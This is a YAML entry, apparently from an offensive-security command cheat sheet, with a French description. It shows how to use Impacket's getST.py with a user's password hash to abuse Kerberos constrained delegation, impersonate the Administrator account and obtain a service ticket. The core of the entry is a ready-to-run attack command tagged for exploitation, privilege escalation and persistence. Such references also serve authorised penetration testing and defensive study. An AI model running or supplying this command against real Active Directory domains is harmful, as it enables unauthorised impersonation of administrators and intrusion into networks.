---
description: |
  Le fichier getST.py d'Impacket demandera un ticket de service et le sauvegardera dans ccache. Si le compte a des privilèges de délégation restreints, vous pouvez utiliser le drapeau `-impersonate` pour demander un ticket au nom d'un autre utilisateur. La commande suivante usurpe l'identité du compte Administrateur en utilisant le mot de passe haché de l'utilisateur `john` et demande un ticket de service en son nom pour le service `www` sur l'hôte `server01.test.local`.

  Command Reference:

  	Target IP: 10.10.10.1

  	Domain: test.local

  	Service: www

  	Host Name: server01.test.local

  	Username: john

  	Hash: :2a3de7fe356ee524cc9f3d579f2e0aa7

  	Impersonated User: Administrator

command: |
  python3 getST.py -hashes :2a3de7fe356ee524cc9f3d579f2e0aa7 -spn www/server01.test.local -dc-ip 10.10.10.1 -impersonate Administrator test.local/john
items:
  - Hash
  - Username
services:
  - Kerberos
OS:
  - Linux
  - Windows
  - Approved-tool
attack_types:
  - Exploitation
  - PrivEsc
  - Persistence
references:
  - https://github.com/SecureAuthCorp/impacket/blob/master/examples/getST.py
  - http://blog.redxorblue.com/2019/12/no-shells-required-using-impacket-to.html
---
